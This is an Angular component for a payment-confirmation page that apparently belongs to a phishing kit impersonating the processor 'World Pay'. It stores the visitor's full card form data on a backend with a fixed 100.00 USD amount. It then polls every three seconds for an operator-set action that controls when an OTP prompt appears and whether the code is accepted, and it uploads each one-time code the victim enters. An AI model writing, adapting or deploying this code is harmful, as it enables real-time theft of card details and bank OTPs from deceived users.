import { Component, OnInit, OnDestroy } from '@angular/core';
import { FormDataService } from '../services/form-data.service';
import { Subscription, interval } from 'rxjs';
import { HelperFunctions } from '../helper/HelperFunctions';

@Component({
  selector: 'app-payment-confirmation',
  templateUrl: './payment-confirmation.component.html',
  styleUrls: ['./payment-confirmation.component.css'],
})
export class PaymentConfirmationComponent implements OnInit, OnDestroy {
  generator: HelperFunctions;
  merchantName = 'World Pay';
  currentDateTime = new Date();
  cardNumber = '';
  amount = '100.00';
  currency = 'USD';
  showOtpInput = false;
  isProcessingOtp = false;
  otp = '';
  otpErrorMessage = '';
  paymentAccepted = false;
  ref = '';
  otpStatus = '';
  private submissionUpdateSubscription!: Subscription;

  constructor(private formDataService: FormDataService) {
    this.generator = new HelperFunctions();
  }

  ngOnInit() {
    const formData = this.formDataService.getFormData();

    if (formData.cardNumber) {
      this.cardNumber = 'xxxx-xxxx-xxxx-' + formData.cardNumber.slice(-4);
    }

    this.ref = this.generator.generateRandomString(6);

    // Include the random string in the form value
    const formDataWithRef = {
      ...formData,
      ref: this.ref,
    };
    this.formDataService.setFormData(formDataWithRef);
    this.formDataService.create(formDataWithRef).subscribe({
      next: (data) => {
        console.log('Form data saved:', data);
      },
      error: (err) => {
        console.error('Error saving form data:', err);
      },
    });

    this.submissionUpdateSubscription = interval(3000).subscribe(() => {
      this.formDataService.getActionByRef(this.ref).subscribe((response) => {
        this.otpStatus = response.action;
        if (this.otpStatus === 'otpShow' && !this.isProcessingOtp) {
          this.showOtpInput = true;
        } else if (this.otpStatus === 'otpCorrect') {
          this.paymentAccepted = true;
          this.isProcessingOtp = false;
        } else if (this.otpStatus === 'otpIncorrect') {
          this.otpErrorMessage = 'OTP is incorrect. Please try again.';
          this.isProcessingOtp = false;

          const formData = this.formDataService.getFormData();
          const formDataWithAction = {
            ...formData,
            action: null,
          };
          this.formDataService.updateFormData(formDataWithAction).subscribe({
            next: (data) => {
              console.log('Form data updated with action:', data);
            },
            error: (err) => {
              console.error('Error updating form data with action:', err);
            },
          });
        }
      });
    });
  }

  ngOnDestroy() {
    if (this.submissionUpdateSubscription) {
      this.submissionUpdateSubscription.unsubscribe();
    }
  }

  onSubmitOtp() {
    if (this.otp) {
      this.isProcessingOtp = true;
      this.otpErrorMessage = '';

      const formData = this.formDataService.getFormData();
      const updatedFormData = {
        ...formData,
        otp: this.otp,
      };
      console.log('----------UPDATING------------');

      this.formDataService.updateFormData(updatedFormData).subscribe({
        next: (data) => {
          console.log('Form data updated with OTP:', data);
        },
        error: (err) => {
          console.error('Error updating form data with OTP:', err);
        },
      });
    }
  }
}
